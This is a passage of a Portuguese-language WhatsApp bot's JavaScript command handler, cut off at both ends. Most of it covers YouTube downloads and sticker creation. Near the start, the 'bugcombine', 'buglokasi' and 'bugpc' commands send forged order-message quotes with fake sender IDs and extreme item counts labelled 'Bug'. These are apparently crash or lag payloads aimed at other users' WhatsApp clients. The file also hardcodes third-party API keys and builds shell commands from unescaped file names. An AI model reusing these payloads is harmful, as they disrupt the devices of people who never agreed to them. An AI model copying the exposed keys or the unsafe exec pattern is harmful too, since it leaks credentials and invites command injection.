	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "5562936180708@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${NomeBot}`,
						"orderTitle": `${NomeCriador}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'bugcombine':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                 edward.toggleDisappearingMessages(from, 'HACKED')
edward.sendMessage(from, `${NomeBot}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // falso sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${NomeBot}`,
    orderTitle: `${NomeCriador}`, // nome
    sellerJid: '0@s.whatsapp.net' // Whatsapp
   }
  }
 }
})
setTimeout( () => {
	    edward.updatePresence(from, Presence.composing)
	    sendMess(`tchau`)
	    }, 2000)
	    reply(`tchau`)
break
case 'buglokasi':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
edward.updatePresence(from, Presence.composing)
		       edward.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${NomeCriador}`,
						address: `${NomeBot}`,
                        jpegThumbnail: img },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Falso sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${NomeCriador}`,
    orderTitle: `${NomeBot}`, // Nome
    sellerJid: '0@s.whatsapp.net' // Whatsapp
   }
  }
 }
})
break
case 'bugpc':
					case 'bugpc':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
edward.updatePresence(from, Presence.composing)
edward.sendMessage(from, 'está bem, está bem',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Falso sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${NomeBot}`,
    orderTitle: `${NomeCriador}`, // Nome
    sellerJid: '0@s.whatsapp.net' // Whatsapp
   }
  }
 }
})
break
     
                case 'ytmp42':                 
						if (args.length === 0) return reply(`Use assim: *${prefix}ytmp4 [linkYt]*`)
						let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks2) return reply(mess.error.Iv)
						try {
							reply(mess.wait)
							ytv(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `❏ *YTmp4*\n\n❏ *Titúlo* : ${title}\n❏ *Ext* : MP3\n*Tamanho* : ${filesizeF}\n*Link* : ${a.data}\n\n_Desculpe, a duração excede o limite máximo, por favor clique no link acima_`)
								sendFileFromUrl(dl_link, document, {mimetype: 'video/mp4', filename: `${title}.mp4`, quoted: mek, thumbnail: img,contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
							})
							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
												case 'ytmp4':                 
						if (args.length === 0) return reply(`Use assim: *${prefix}ytmp4 [linkYt]*`)
						let isLinksv = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinksv) return reply('use o comando seguido de um link!!!')
						try {
							reply(mess.wait)
							ytDonlodMp4(args[0])
							.then((result) => {
								const { link, thumb, título, visualizações, publicado } = result
								axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
								.then((a) => {
//								if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `❏ *YTmp4*\n\n❏ *Titúlo* : ${title}\n❏ *Ext* : MP3\n*Tamanho* : ${filesizeF}\n*Link* : ${a.data}\n\n_Desculpe, a duração excede o limite máximo, por favor clique no link acima_`)
								sendFileFromUrl(link, video, { quoted: mek, thumbnail: img,contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:título,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${args[0]}`}}}).catch(() => reply(mess.error.api))
							})
							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
						case 'ytmp4gif':                 
						if (args.length === 0) return reply(`Use assim: *${prefix}ytmp4 [linkYt]*`)
						let isLinksgif = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinksgif) return reply(mess.error.Iv)
						try {
							reply(mess.wait)
							ytDonlodMp4(args[0])
							.then((result) => {
								const { link, thumb, título, visualizações, publicado } = result
								axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
								.then((a) => {
//								if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `❏ *YTmp4*\n\n❏ *Titúlo* : ${title}\n❏ *Ext* : MP3\n*Tamanho* : ${filesizeF}\n*Link* : ${a.data}\n\n_Desculpe, a duração excede o limite máximo, por favor clique no link acima_`)
								sendFileFromUrl(link, video, { mimetype: Mimetype.gif, quoted: mek, thumbnail: img,contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:título,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${args[0]}`}}}).catch(() => reply(mess.error.api))
							})
							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
						case 'ytmp4gif2':                 
						if (args.length === 0) return reply(`Use assim: *${prefix}ytmp4 [linkYt]*`)
						let isLinksgif2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinksgif) return reply(mess.error.Iv)
						try {
							reply(mess.wait)
							ytv(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `❏ *YTmp4*\n\n❏ *Titúlo* : ${title}\n❏ *Ext* : MP3\n*Tamanho* : ${filesizeF}\n*Link* : ${a.data}\n\n_Desculpe, a duração excede o limite máximo, por favor clique no link acima_`)
								sendFileFromUrl(dl_link, video, { mimetype: Mimetype.gif, quoted: mek, thumbnail: img,contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${args[0]}`}}}).catch(() => reply(mess.error.api))
							})
							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
						case 'ytsearch':
            if (!args.length) return reply('Qual é o título mano??')
            try {
            	reply(mess.wait)
                const input = args.join(" ")
                const filter1 = await ytsd.getFilters(input)
                const filters1 = filter1.get('Type').get('Video')
                const { items } = await ytsd(filters1.url, { limit: 10 })
                let hehe = `┌ ◪ *YOUTUBE SEARCH*
└ *Pesquisa:* ${input}\n\n`
                for (let i = 0; i < items.length; i++) {
                    hehe += `───────────────\n
┌ ❏ *Titúlo:* ${items[i].title}
❏ *Id:* ${items[i].id}
❏ *Visualizações:* ${items[i].views}
❏ *Duração:* ${items[i].duration}
└ ❏ *Link:* ${items[i].url}\n\n`
                }
                thumb = await getBuffer(items[0].bestThumbnail.url)
                await edward.sendMessage(from, thumb, image, {quoted: mek, caption: `${hehe}───────────────\n\n┌ ◪ *DOWNLOAD*
${prefix}ytmp3 [link yt] = Aúdio
└ ${prefix}ytmp4 [link yt] = Vídeo`})
            } catch(e) {
                reply('Pesquisa não encontrada!')
                reply(`Error: ${e.message}`)
            }
            break
				case 'ytmp3':					 
						if (args.length === 0) return reply(`Use assim *${prefix}ytmp3 [linkYt]*`)
				link = args.join(" ")
							reply(mess.wait)
							cuzao = body.slice(7)
							cu = await fetchJson(`https://akame-api.herokuapp.com/api/ytmp3v2?link=${link}&apikey=edwardbot22`)
							
							cugrande = `    \`\`\` VIDEO ENCONTRADO \`\`\`
\`\`\`Título:\`\`\`   📜 ${cu.resultado.título}
\`\`\` Views:\`\`\`   👀 ${cu.resultado.visualizações}
\`\`\` Likes:\`\`\`   👍 ${cu.resultado.likes}
\`\`\` Canal:\`\`\`   📺 ${cu.resultado.canal}
							`
							cuzinhu = await getBuffer(cu.resultado.capa)
				      cuzinho2 = await getBuffer(cu.resultado.resultado)
				      edward.sendMessage(from, cuzinhu, image, {quoted: mek, caption: cugrande})
				      edward.sendMessage(from, cuzinho2, audio, {quoted: { key: {
                fromMe: false,

                                                participant: `0@s.whatsapp.net`,
                                                ...(from ? {
                                                    remoteJid: "status@broadcast"
                                                } : {})
                                            },
                                            message: {
                                                "imageMessage": {
                                                    "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                                                    "mimetype": "image/jpeg",
                                                    "caption": `${cu.resultado.título}`,
                                                    "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                                                    "fileLength": "28777",
                                                    "height": 1080,
                                                    "width": 1079,
                                                    "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                                                    "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                                                    "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                                                    "mediaKeyTimestamp": "1610993486",
                                                    "jpegThumbnail": await getBuffer(cu.resultado.capa)
                                                }
                                            }
                                        },
                                        mimetype: 'audio/mp4'
                                    })
                            
						break
case 'playdl':
             if (args.length < 1) return reply('Cadé o link??')
             reply(mess.wait)
datai = [];
try{
ysearch  = await yts(c)
hdata = ysearch.all
}catch(e){
return reply(mess.error.api)
}
             
              buttons = [{buttonId: `video ${c}`,buttonText:{displayText: `▶️ Video`},type:1},{buttonId: `videogif ${c}`,buttonText:{displayText: `▶️ Video/gif`},type:1},{buttonId:`audiodl ${c}`,buttonText:{displayText:'🎵 Audio'},type:1}]
              fs.writeFileSync(`./ytmp.jpeg`, await getBuffer(hdata[0].image))
              imageMsg = ( await edward.prepareMessage(from, fs.readFileSync(`./ytmp.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Escolha um formato abaixo', imageMessage: imageMsg,
              contentText:`${result}`,buttons,headerType:4}
              sayo = await edward.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              edward.relayWAMessage(sayo)
              fs.unlinkSync(`./ytmp.jpeg`)
              break						
			
                case 'audiodl': 

                  linkyt = await yts(c);

                   linkyt2 = linkyt.all 
                   linkyt3 = linkyt2[0].url        
                			if (!c) return reply(`Exemplo: ${prefix + command} Akame`)                   
                   reply(`Estou fazendo 🤠`)
                   anu = await fetchJson(`https://akame-api.herokuapp.com/api/ytplay?nome=${c}&apikey=edwardbot22`)
                   thumb = await getBuffer(anu.resultado.thumb)
                   titulor = await getBuffer(anu.resultado.título)
                   audioresultado = await getBuffer(anu.resultado.link)
                   edward.sendMessage(from, audioresultado, audio, {mimetype: 'audio/mp4', ptt:false, quoted: mek,thumbnail: thumb, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:titulor,body:"",mediaType:"2",thumbnail:thumb,mediaUrl:linkyt3}}}).catch(() => reply(mess.error.api))   
                   break

                    case 'play':                 
                            if (args.length === 0) return reply(`Use assim *${prefix + command}* _O título da música a ser pesquisada_`)
                            pesquisa = await yts(c);
                            pesquisa2 = pesquisa.all 
                           resultado = pesquisa2[0].url                            
                            try {
                                reply(mess.wait)
                                yta(resultado)
                                .then((res) => {
                                    const { dl_link, thumb, title, filesizeF, filesize } = res
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *PLAYmp3*\n\n❏ *Titúlo* : ${title}\n❏ *Ext* : MP3\n*Tamanho* : ${filesizeF}\n*Link* : ${a.data}\n\n_Desculpe, a duração excede o limite máximo, por favor clique no link acima_`)
                                  //  sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: mek,thumbnail: img, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:resultado}}}).catch(() => reply(mess.error.api))        
                                      sendFileFromUrl(dl_link, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: mek,thumbnail: img, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:resultado}}}).catch(() => reply(mess.error.api))        
                                    })
                                })
                            } catch (err) {
                                reply(mess.error.api)
                            }              
                            break
                            case 'play2':
           
                if (!c) return reply(`Use assim: *${prefix}play nome*`)
                try {
                    reply(mess.wait)
                    yts(c)
                    .then(async (res) =>{
                    let qqppp = [{
                        "buttonId": `${prefix}ytmp3 ${res.videos[0].url}`,
                        "buttonText": {
                            "displayText": "💿ÁUDIO💿"
                            },
                        "type": "RESPONSE"
                        },{
                    "buttonId": `${prefix}ytmp4 ${res.videos[0].url}`,
                    "buttonText": {
                        "displayText": "🎥VÍDEO🎥"
                    },
                    "type": "RESPONSE"
                                        },{
                    "buttonId": `${prefix}ytmp4gif ${res.videos[0].url}`,
                    "buttonText": {
                        "displayText": "🎥VÍDEO GIF🎥"
                    },
                    "type": "RESPONSE"
                }]
                sendButloc(from, `${c}`, `Selecione o modo de donwload abaixo...`, await getBuffer('https://img.youtube.com/vi/' + res.videos[0].videoId + '/sddefault.jpg'), qqppp, MessageType.buttonsMessage,{quoted:mek})
                })
                    .catch((err) => reply(`${err}`))
                } catch (err) {                    
                    console.log(color('[PlayMp3]', 'red'), err)
                    reply('puts deu erro :/')
                }
                //await limitAdd(sender)
                break
                            case 'videogif':
                            if (args.length === 0) return reply(`Use assim *${prefix + command}* _O título do vídeo a ser pesquisado_`)
                            pesquisa = await yts(c);
                            pesquisa2 = pesquisa.all 
                           resultado = pesquisa2[0].url            
                            try {
                                reply(mess.wait)
                                ytv(resultado)
                                .then((res) => {
                                    const { dl_link, thumb, title, filesizeF, filesize } = res
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *PLAYmp4*\n\n❏ *Titúlo* : ${title}\n❏ *Ext* : MP4\n*Tamanho* : ${filesizeF}\n*Link* : ${a.data}\n\n_Desculpe, a duração excede o limite máximo, por favor clique no link acima_`)
                                    sendFileFromUrl(dl_link, video, { mimetype: Mimetype.gif, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:resultado}}}).catch(() => reply(mess.error.api))
                                    })
                                })
                            } catch (err) {
                                reply(mess.error.api)
                            }                    
                            break
                            case 'video':
                            if (args.length === 0) return reply(`Use assim *${prefix + command}* _O título do vídeo a ser pesquisado_`)
                            pesquisa = await yts(c);
                            pesquisa2 = pesquisa.all 
                           resultado = pesquisa2[0].url            
                            try {
                                reply(mess.wait)
                                ytPlayMp4(resultado)
                                .then((result) => {
                                    const { título, thumb, publicado, canal, url } = result
                                    axios.get(`https://tinyurl.com/api-create.php?url=${url}`)
                                    .then(async (a) => {
//                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *PLAYmp4*\n\n❏ *Titúlo* : ${título}\n❏ *Ext* : MP4\n*Canal* : ${canal}\n*Link* : ${url}\n\n_Desculpe, a duração excede o limite máximo, por favor clique no link acima_`)
                                    sendFileFromUrl(url, video, {mimetype: 'video/mp4', quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`Musica encontrada!!`,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:resultado}}}).catch(() => reply(mess.error.api))
                                    })
                                })
                            } catch (err) {
                                reply(mess.error.api)
                            }                    
                            break
/*             case 'playvideo':
            if (args.length === 0) return reply(`Use assim : *${prefix + command}* _O título da música_`)            
           aramas = await yts(c);
            aramat = aramas.all 
            mulaikah = aramat[0].url                            
            console.log(color('[YT PLAY VÍDEO]', 'magenta'), color(`PROCURANDO O VÍDEO NO YT`, 'yellow'))       
                  try {
                    ytv(mulaikah)
                    reply(mess.wait)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*「 REPRODUZIR VÍDEOS 」*\n\n*Titulo* : ${title}\n*Extração* : MP3\n*Tamanho do arquivo* : ${filesizeF}\n*Link* : ${a.data}\n\n_Aguarde o envio do arquivo; isso pode levar alguns minutos_`)
                        const captions = `*「 REPRODUZIR VÍDEOS 」*\n\n*Titulo* : ${title}\n*Extração* : MP4\n*Tamanho* : ${filesizeF}\n*Link para dowload* : ${a.data}\n\n_Aguarde o envio do arquivo; isso pode levar alguns minutos_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
break
case 'play':                   
			if (args.length === 0) return reply(`Use assim *${prefix + command}* _O título da música a ser pesquisada_`)
    		aramas = await yts(c);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
   			console.log(color('[YT PLAY MÚSICA]', 'magenta'), color(`PROCURANDO A MÚSICA NO YT`, 'yellow')) 
                  try {
                    yta(mulaikah)
                    reply(mess.wait)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*「 TOCAR MÚSICA 」*\n\n*Titulo* : ${title}\n*Extração* : mp3\n*Tamanho do arquivo* : ${filesizeF}\n*Link para dowload* : ${a.data}\n\n_Aguarde o envio do arquivo; isso pode levar alguns minutos_`)
                        const captions = `*「 TOCAR MÚSICA 」*\n\n*Titulo* : ${title}\n*Extração* : mp3\n*Tamanho* : ${filesizeF}\n*Link para dowload* : ${a.data}\n\n_Aguarde o envio do arquivo; isso pode levar alguns minutos_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(err)
                        }
break */
                    case 'exif':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					const exifff = `${args.join(' ')}`
					const namaPack = exifff.split('|')[0]
					const authorPack = exifff.split('|')[1]
					exif.create(namaPack, authorPack)
					await reply('Aqui está!! 🤠')
				break
 			case 'figurinha':
				case 'sticker':
					case 'stiker':
					case 'figu':				
					case 's':
					case 'f':
			     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await edward.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                edward.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await edward.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Deu erro ao fze a figurinha: ${tipe}`)
            })
            .on('end', function () {
            console.log('Finish')
            edward.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Marque foto/vídeo que tenha pelo menos 10 segundos de duração`)
            }
            break    
	
					case 'stickerwm':
					case 'swm':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							ppp = `${args.join(' ')}`
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await edward.downloadAndSaveMediaMessage(encmedia, `./figurinha_exif/${sender}`)
							const packname1 = ppp.split('|')[0]
							const author1 = ppp.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Iniciando : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Pronto')
										exec(`webpmux -set exif ./figurinha_exif/stickwm_${sender}.exif ./figurinha_exif/${sender}.webp -o ./figurinha_exif/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											edward.sendMessage(from, fs.readFileSync(`./figurinha_exif/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./figurinha_exif/${sender}.webp`)	
											fs.unlinkSync(`./figurinha_exif/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./figurinha_exif/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await edward.downloadAndSaveMediaMessage(encmedia, `./figurinha_exif/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Iniciando : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Pronto')
										exec(`webpmux -set exif ./figurinha_exif/stickwm_${sender}.exif ./figurinha_exif/${sender}.webp -o ./figurinha_exif/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											edward.sendMessage(from, fs.readFileSync(`./figurinha_exif/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./figurinha_exif/${sender}.webp`)
											fs.unlinkSync(`./figurinha_exif/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./figurinha_exif/${sender}.webp`)
						} else {
							reply(`enviar foto/video com legenda ${prefix + command} ou marque imagem/video que já foi enviado\nNota : Duração máxima do vídeo 10 segundos`)
						}
						break
case 'figurinha512':
case 'sticker512':
case 'stiker512':
case 'figu512':				
case 's512':
case 'f512':
if (isMedia && !mek.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await edward.downloadAndSaveMediaMessage(encmedia)                                     
rano = getRandom('.webp')
await ffmpeg(`./temp/${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ./figurinha_exif/data.exif ./figurinha_exif/${sender}.webp -o ./figurinha_exif/${sender}.webp`, async (error) => {
fs.unlinkSync(media)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
edward.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(rano)
})
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await edward.downloadAndSaveMediaMessage(encmedia)
rano = getRandom('.webp')
reply(`[❗] AGUARDE`)
await ffmpeg(`./temp/${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ./figurinha_exif/data.exif ./figurinha_exif/${sender}.webp -o ./figurinha_exif/${sender}.webp`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Falha na conversão de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
edward.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(rano)
})
} else {
reply(`Você precisa enviar ou marcar uma imagem ou vídeo com no máximo 10 segundos`)
}
break						
					case 'renomear':
					case 'take':
					case 'roubar':
						if (!isQuotedSticker) return reply(`Marque alguma figurinha usando: *${prefix + command} nome|autor*`)
						ppp = `${args.join(' ')}`
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await edward.downloadAndSaveMediaMessage(encmedia, `./figurinha_exif/${sender}`)
						const packname = ppp.split('|')[0]
						const author = ppp.split('|')[1]
						exif.create(packname, author, `takestick_${sender}`)
						exec(`webpmux -set exif ./figurinha_exif/takestick_${sender}.exif ./figurinha_exif/${sender}.webp -o ./figurinha_exif/${sender}.webp`, async (error) => {
							if (error) return reply(mess.error.api)
							edward.sendMessage(from, fs.readFileSync(`./figurinha_exif/${sender}.webp`), sticker, {quoted: mek})
							fs.unlinkSync(media)
							fs.unlinkSync(`./figurinha_exif/takestick_${sender}.exif`)
						})
						break

                 ////////
break

case 'figuwasted':
case 'swasted':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
reply(mess.wait)
owgi = await edward.downloadAndSaveMediaMessage(ger)
anu = await imgbb("f2d03a801441d9021abfe0fa5e46385e", owgi)
imgtrg = `${anu.display_url}`
anu1 = `https://api-exteam.herokuapp.com/api/wasted?img=${imgtrg}`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break
case 'removebg':

	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	reply(mess.wait)
	owgi = await levi.downloadAndSaveMediaMessage(ted)
	tels = body.slice(10)
